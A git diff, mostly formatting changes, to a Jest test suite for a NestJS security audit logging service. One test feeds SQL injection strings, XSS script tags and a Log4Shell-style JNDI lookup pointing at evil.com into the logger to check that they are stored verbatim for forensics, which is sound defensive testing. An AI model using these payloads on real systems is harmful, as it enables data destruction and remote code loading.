@@ -3,10 +3,10 @@ import { getRepositoryToken } from '@nestjs/typeorm';
 import { Repository } from 'typeorm';
 import { Logger } from '@nestjs/common';
 import { SecurityAuditService, AuditEventData } from './security-audit.service';
-import { 
-  SecurityAuditLog, 
-  SecurityEventType, 
-  SecurityEventMetadata 
+import {
+  SecurityAuditLog,
+  SecurityEventType,
+  SecurityEventMetadata,
 } from '../entities/security-audit.entity';
 import { MockFactory } from '../../../test/test-utils';
 import { randomUUID } from 'crypto';
@@ -78,7 +78,7 @@ describe('SecurityAuditService - Security Tests', () => {
       // Assert
       expect(auditRepository.save).toHaveBeenCalledTimes(1);
       const savedEntity = auditRepository.save.mock.calls[0][0];
-      
+
       expect(savedEntity.eventType).toBe(SecurityEventType.API_KEY_USED);
       expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
       expect(savedEntity.ipAddress).toBe(TEST_IP);
@@ -102,7 +102,9 @@ describe('SecurityAuditService - Security Tests', () => {
 
       // Assert
       const savedEntity = auditRepository.save.mock.calls[0][0];
-      expect(savedEntity.eventType).toBe(SecurityEventType.INVALID_API_KEY_ATTEMPT);
+      expect(savedEntity.eventType).toBe(
+        SecurityEventType.INVALID_API_KEY_ATTEMPT,
+      );
       expect(savedEntity.apiKeyId).toBeNull();
       expect(savedEntity.ipAddress).toBeNull();
       expect(savedEntity.userAgent).toBeNull();
@@ -133,7 +135,7 @@ describe('SecurityAuditService - Security Tests', () => {
           apiKeyId: TEST_API_KEY_ID,
           ipAddress: undefined,
           requestId: undefined,
-        }
+        },
       );
     });
 
@@ -144,18 +146,20 @@ describe('SecurityAuditService - Security Tests', () => {
         message: 'Test event',
       };
 
-      auditRepository.save.mockRejectedValue(new Error('Database connection failed'));
+      auditRepository.save.mockRejectedValue(
+        new Error('Database connection failed'),
+      );
 
       // Act & Assert - Should not throw
       await expect(service.logSecurityEvent(eventData)).resolves.not.toThrow();
-      
+
       // Should log the error
       expect(logger.error).toHaveBeenCalledWith(
         'Failed to log security event - this is a critical security issue',
         {
           error: 'Database connection failed',
           eventData,
-        }
+        },
       );
     });
 
@@ -164,7 +168,7 @@ describe('SecurityAuditService - Security Tests', () => {
       const maliciousEventData: AuditEventData = {
         eventType: SecurityEventType.API_KEY_USED,
         apiKeyId: "'; DROP TABLE security_audit_log; --",
-        ipAddress: '127.0.0.1\'; DELETE FROM users; --',
+        ipAddress: "127.0.0.1'; DELETE FROM users; --",
         userAgent: '<script>alert("XSS")</script>',
         message: 'Normal message with ${jndi:ldap://evil.com/a} injection',
         metadata: {
@@ -181,9 +185,11 @@ describe('SecurityAuditService - Security Tests', () => {
       // Assert - Data should be stored as-is for forensic analysis
       const savedEntity = auditRepository.save.mock.calls[0][0];
       expect(savedEntity.apiKeyId).toBe("'; DROP TABLE security_audit_log; --");
-      expect(savedEntity.ipAddress).toBe('127.0.0.1\'; DELETE FROM users; --');
+      expect(savedEntity.ipAddress).toBe("127.0.0.1'; DELETE FROM users; --");
       expect(savedEntity.userAgent).toBe('<script>alert("XSS")</script>');
-      expect(savedEntity.message).toBe('Normal message with ${jndi:ldap://evil.com/a} injection');
+      expect(savedEntity.message).toBe(
+        'Normal message with ${jndi:ldap://evil.com/a} injection',
+      );
       expect(savedEntity.metadata).toEqual({
         maliciousScript: '<script>alert(1)</script>',
         sqlInjection: "'; DROP TABLE api_keys; --",
@@ -203,13 +209,13 @@ describe('SecurityAuditService - Security Tests', () => {
         TEST_USER_AGENT,
         TEST_REQUEST_ID,
         TEST_ENDPOINT,
-        TEST_ORG_ID
+        TEST_ORG_ID,
       );
 
       // Assert
       expect(auditRepository.save).toHaveBeenCalledTimes(1);
       const savedEntity = auditRepository.save.mock.calls[0][0];
-      
+
       expect(savedEntity.eventType).toBe(SecurityEventType.API_KEY_USED);
       expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
       expect(savedEntity.ipAddress).toBe(TEST_IP);
@@ -230,7 +236,7 @@ describe('SecurityAuditService - Security Tests', () => {
         TEST_IP,
         TEST_USER_AGENT,
         TEST_REQUEST_ID,
-        TEST_ENDPOINT
+        TEST_ENDPOINT,
         // No organization ID
       );
 
@@ -251,18 +257,22 @@ describe('SecurityAuditService - Security Tests', () => {
         TEST_IP,
         TEST_USER_AGENT,
         TEST_REQUEST_ID,
-        TEST_ENDPOINT
+        TEST_ENDPOINT,
       );
 
       // Assert
       const savedEntity = auditRepository.save.mock.calls[0][0];
-      expect(savedEntity.eventType).toBe(SecurityEventType.INVALID_API_KEY_ATTEMPT);
+      expect(savedEntity.eventType).toBe(
+        SecurityEventType.INVALID_API_KEY_ATTEMPT,
+      );
       expect(savedEntity.hashedKey).toBe(TEST_HASHED_KEY);
       expect(savedEntity.ipAddress).toBe(TEST_IP);
       expect(savedEntity.userAgent).toBe(TEST_USER_AGENT);
       expect(savedEntity.requestId).toBe(TEST_REQUEST_ID);
       expect(savedEntity.metadata).toEqual({ endpoint: TEST_ENDPOINT });
-      expect(savedEntity.message).toBe(`Invalid API key attempt from ${TEST_IP} for ${TEST_ENDPOINT}`);
+      expect(savedEntity.message).toBe(
+        `Invalid API key attempt from ${TEST_IP} for ${TEST_ENDPOINT}`,
+      );
     });
 
     it('should log multiple attempts from same IP for pattern detection', async () => {
@@ -276,18 +286,20 @@ describe('SecurityAuditService - Security Tests', () => {
           TEST_IP,
           TEST_USER_AGENT,
           `${TEST_REQUEST_ID}-${i}`,
-          TEST_ENDPOINT
+          TEST_ENDPOINT,
         );
       }
 
       // Assert
       expect(auditRepository.save).toHaveBeenCalledTimes(5);
-      
+
       // All should be from same IP
-      auditRepository.save.mock.calls.forEach(call => {
+      auditRepository.save.mock.calls.forEach((call) => {
         const entity = call[0];
         expect(entity.ipAddress).toBe(TEST_IP);
-        expect(entity.eventType).toBe(SecurityEventType.INVALID_API_KEY_ATTEMPT);
+        expect(entity.eventType).toBe(
+          SecurityEventType.INVALID_API_KEY_ATTEMPT,
+        );
       });
     });
   });
@@ -310,7 +322,7 @@ describe('SecurityAuditService - Security Tests', () => {
         TEST_USER_AGENT,
         TEST_REQUEST_ID,
         rateLimitInfo,
-        TEST_ORG_ID
+        TEST_ORG_ID,
       );
 
       // Assert
@@ -319,7 +331,7 @@ describe('SecurityAuditService - Security Tests', () => {
       expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
       expect(savedEntity.metadata).toEqual({ rateLimitInfo });
       expect(savedEntity.message).toBe(
-        `Rate limit exceeded: ${rateLimitInfo.current}/${rateLimitInfo.limit} requests in ${rateLimitInfo.windowMs}ms window`
+        `Rate limit exceeded: ${rateLimitInfo.current}/${rateLimitInfo.limit} requests in ${rateLimitInfo.windowMs}ms window`,
       );
     });
 
@@ -335,18 +347,20 @@ describe('SecurityAuditService - Security Tests', () => {
           TEST_IP,
           TEST_USER_AGENT,
           TEST_REQUEST_ID,
-          { limit: 100, current: 101, windowMs: 3600000 }
+          { limit: 100, current: 101, windowMs: 3600000 },
         );
       }
 
       // Assert
       expect(auditRepository.save).toHaveBeenCalledTimes(3);
-      
+
       // Should log different API keys but same IP (potential abuse)
-      const loggedApiKeys = auditRepository.save.mock.calls.map(call => call[0].apiKeyId);
+      const loggedApiKeys = auditRepository.save.mock.calls.map(
+        (call) => call[0].apiKeyId,
+      );
       expect(new Set(loggedApiKeys).size).toBe(3); // All different
-      
-      auditRepository.save.mock.calls.forEach(call => {
+
+      auditRepository.save.mock.calls.forEach((call) => {
         expect(call[0].ipAddress).toBe(TEST_IP); // Same IP
       });
     });
@@ -358,7 +372,7 @@ describe('SecurityAuditService - Security Tests', () => {
       const keyName = 'Production API Key';
       const scopes = ['notifications:create', 'notifications:read'];
       const createdByUserId = 'user-123';
-      
+
       auditRepository.save.mockResolvedValue({} as SecurityAuditLog);
 
       // Act
@@ -367,7 +381,7 @@ describe('SecurityAuditService - Security Tests', () => {
         keyName,
         scopes,
         createdByUserId,
-        TEST_ORG_ID
+        TEST_ORG_ID,
       );
 
       // Assert
@@ -381,7 +395,7 @@ describe('SecurityAuditService - Security Tests', () => {
         createdByUserId,
       });
       expect(savedEntity.message).toBe(
-        `API key '${keyName}' created with scopes: ${scopes.join(', ')}`
+        `API key '${keyName}' created with scopes: ${scopes.join(', ')}`,
       );
     });
 
@@ -389,7 +403,7 @@ describe('SecurityAuditService - Security Tests', () => {
       // Arrange
       const keyName = 'Old API Key';
       const deletedByUserId = 'admin-456';
-      
+
       auditRepository.save.mockResolvedValue({} as SecurityAuditLog);
 
       // Act
@@ -397,7 +411,7 @@ describe('SecurityAuditService - Security Tests', () => {
         TEST_API_KEY_ID,
         keyName,
         deletedByUserId,
-        TEST_ORG_ID
+        TEST_ORG_ID,
       );
 
       // Assert
@@ -423,7 +437,7 @@ describe('SecurityAuditService - Security Tests', () => {
         TEST_USER_AGENT,
         TEST_REQUEST_ID,
         TEST_ENDPOINT,
-        TEST_ORG_ID
+        TEST_ORG_ID,
       );
 
       // Assert
@@ -432,7 +446,9 @@ describe('SecurityAuditService - Security Tests', () => {
       expect(savedEntity.apiKeyId).toBe(TEST_API_KEY_ID);
       expect(savedEntity.ipAddress).toBe(TEST_IP);
       expect(savedEntity.metadata).toEqual({ endpoint: TEST_ENDPOINT });
-      expect(savedEntity.message).toBe(`Expired API key attempt for ${TEST_ENDPOINT}`);
+      expect(savedEntity.message).toBe(
+        `Expired API key attempt for ${TEST_ENDPOINT}`,
+      );
     });
   });
 
@@ -440,8 +456,16 @@ describe('SecurityAuditService - Security Tests', () => {
     it('should retrieve recent events with proper ordering', async () => {
       // Arrange
       const mockEvents = [
-        { id: '1', eventType: SecurityEventType.API_KEY_USED, timestamp: new Date() },
-        { id: '2', eventType: SecurityEventType.INVALID_API_KEY_ATTEMPT, timestamp: new Date() },
+        {
+          id: '1',
+          eventType: SecurityEventType.API_KEY_USED,
+          timestamp: new Date(),
+        },
+        {
+          id: '2',
+          eventType: SecurityEventType.INVALID_API_KEY_ATTEMPT,
+          timestamp: new Date(),
+        },
       ] as SecurityAuditLog[];
 
       const mockQueryBuilder = {
@@ -451,21 +475,29 @@ describe('SecurityAuditService - Security Tests', () => {
         getMany: jest.fn().mockResolvedValue(mockEvents),
       };
 
-      auditRepository.createQueryBuilder.mockReturnValue(mockQueryBuilder as any);
+      auditRepository.createQueryBuilder.mockReturnValue(
+        mockQueryBuilder as any,
+      );
 
       // Act
       const result = await service.getRecentEvents(50);
 
       // Assert
       expect(auditRepository.createQueryBuilder).toHaveBeenCalledWith('audit');
-      expect(mockQueryBuilder.orderBy).toHaveBeenCalledWith('audit.timestamp', 'DESC');
+      expect(mockQueryBuilder.orderBy).toHaveBeenCalledWith(
+        'audit.timestamp',
+        'DESC',
+      );
       expect(mockQueryBuilder.limit).toHaveBeenCalledWith(50);
       expect(result).toEqual(mockEvents);
     });
 
     it('should filter events by type when specified', async () => {
       // Arrange
-      const eventTypes = [SecurityEventType.INVALID_API_KEY_ATTEMPT, SecurityEventType.RATE_LIMIT_EXCEEDED];
+      const eventTypes = [
+        SecurityEventType.INVALID_API_KEY_ATTEMPT,
+        SecurityEventType.RATE_LIMIT_EXCEEDED,
+      ];
       const mockEvents = [] as SecurityAuditLog[];
 
       const mockQueryBuilder = {
@@ -475,7 +507,9 @@ describe('SecurityAuditService - Security Tests', () => {
         getMany: jest.fn().mockResolvedValue(mockEvents),
       };
 
-      auditRepository.createQueryBuilder.mockReturnValue(mockQueryBuilder as any);
+      auditRepository.createQueryBuilder.mockReturnValue(
+        mockQueryBuilder as any,
+      );
 
       // Act
       await service.getRecentEvents(100, eventTypes);
@@ -483,14 +517,18 @@ describe('SecurityAuditService - Security Tests', () => {
       // Assert
       expect(mockQueryBuilder.where).toHaveBeenCalledWith(
         'audit.eventType IN (:...eventTypes)',
-        { eventTypes }
+        { eventTypes },
       );
     });
 
     it('should retrieve events for specific API key', async () => {
       // Arrange
       const mockEvents = [
-        { id: '1', apiKeyId: TEST_API_KEY_ID, eventType: SecurityEventType.API_KEY_USED },
+        {
+          id: '1',
+          apiKeyId: TEST_API_KEY_ID,
+          eventType: SecurityEventType.API_KEY_USED,
+        },
       ] as SecurityAuditLog[];
 
       auditRepository.find.mockResolvedValue(mockEvents);
@@ -511,7 +549,7 @@ describe('SecurityAuditService - Security Tests', () => {
       // Arrange
       auditRepository.count
         .mockResolvedValueOnce(15) // Invalid attempts
-        .mockResolvedValueOnce(8)  // Rate limit exceeded
+        .mockResolvedValueOnce(8) // Rate limit exceeded
         .mockResolvedValueOnce(3); // Expired key attempts
 
       const mockQueryBuilder = {
@@ -521,7 +559,9 @@ describe('SecurityAuditService - Security Tests', () => {
         getRawOne: jest.fn().mockResolvedValue({ count: '12' }),
       };
 
-      auditRepository.createQueryBuilder.mockReturnValue(mockQueryBuilder as any);
+      auditRepository.createQueryBuilder.mockReturnValue(
+        mockQueryBuilder as any,
+      );
 
       // Act
       const result = await service.getSuspiciousActivity(24);
@@ -565,7 +605,8 @@ describe('SecurityAuditService - Security Tests', () => {
           rateLimit: { limit: 100, current: 150, windowMs: 3600000 },
           customData: 'Special forensic information',
         },
-        message: 'Suspicious activity detected: multiple privilege escalation attempts',
+        message:
+          'Suspicious activity detected: multiple privilege escalation attempts',
       };
 
       auditRepository.save.mockResolvedValue({} as SecurityAuditLog);
@@ -577,7 +618,7 @@ describe('SecurityAuditService - Security Tests', () => {
       const savedEntity = auditRepository.save.mock.calls[0][0];
       expect(savedEntity.metadata).toEqual(complexEventData.metadata);
       expect(savedEntity.message).toBe(complexEventData.message);
-      
+
       // Verify all security-relevant fields are preserved
       expect(savedEntity.eventType).toBe(complexEventData.eventType);
       expect(savedEntity.apiKeyId).toBe(complexEventData.apiKeyId);
@@ -598,12 +639,12 @@ describe('SecurityAuditService - Security Tests', () => {
       }));
 
       // Act
-      const promises = events.map(event => service.logSecurityEvent(event));
+      const promises = events.map((event) => service.logSecurityEvent(event));
       await Promise.all(promises);
 
       // Assert
       expect(auditRepository.save).toHaveBeenCalledTimes(10);
-      
+
       // Each event should have been saved with correct data
       events.forEach((event, index) => {
         const savedEntity = auditRepository.save.mock.calls[index][0];
@@ -633,7 +674,7 @@ describe('SecurityAuditService - Security Tests', () => {
         {
           error: 'Database error',
           eventData: criticalEvent,
-        }
+        },
       );
 
       // Event logging should not have thrown an exception
@@ -652,9 +693,14 @@ describe('SecurityAuditService - Security Tests', () => {
           message: `Test event for ${eventType}`,
         };
 
-        await expect(service.logSecurityEvent(eventData)).resolves.not.toThrow();
-        
-        const savedEntity = auditRepository.save.mock.calls[auditRepository.save.mock.calls.length - 1][0];
+        await expect(
+          service.logSecurityEvent(eventData),
+        ).resolves.not.toThrow();
+
+        const savedEntity =
+          auditRepository.save.mock.calls[
+            auditRepository.save.mock.calls.length - 1
+          ][0];
         expect(savedEntity.eventType).toBe(eventType);
       }
     });
@@ -671,7 +717,7 @@ describe('SecurityAuditService - Security Tests', () => {
           },
         },
         headers: Object.fromEntries(
-          Array.from({ length: 100 }, (_, i) => [`header-${i}`, `value-${i}`])
+          Array.from({ length: 100 }, (_, i) => [`header-${i}`, `value-${i}`]),
         ),
       };
 
@@ -705,11 +751,11 @@ describe('SecurityAuditService - Security Tests', () => {
 
       // Act
       const startTime = Date.now();
-      
+
       for (const event of events) {
         await service.logSecurityEvent(event);
       }
-      
+
       const endTime = Date.now();
       const duration = endTime - startTime;
 
@@ -738,14 +784,14 @@ describe('SecurityAuditService - Security Tests', () => {
 
       // Assert - All high severity events should be logged to application logger
       expect(logger.log).toHaveBeenCalledTimes(3);
-      
+
       highSeverityEvents.forEach((eventType, index) => {
         expect(logger.log).toHaveBeenNthCalledWith(
           index + 1,
           `Security Event: ${eventType} - High severity event: ${eventType}`,
           expect.objectContaining({
             eventType,
-          })
+          }),
         );
       });
     });
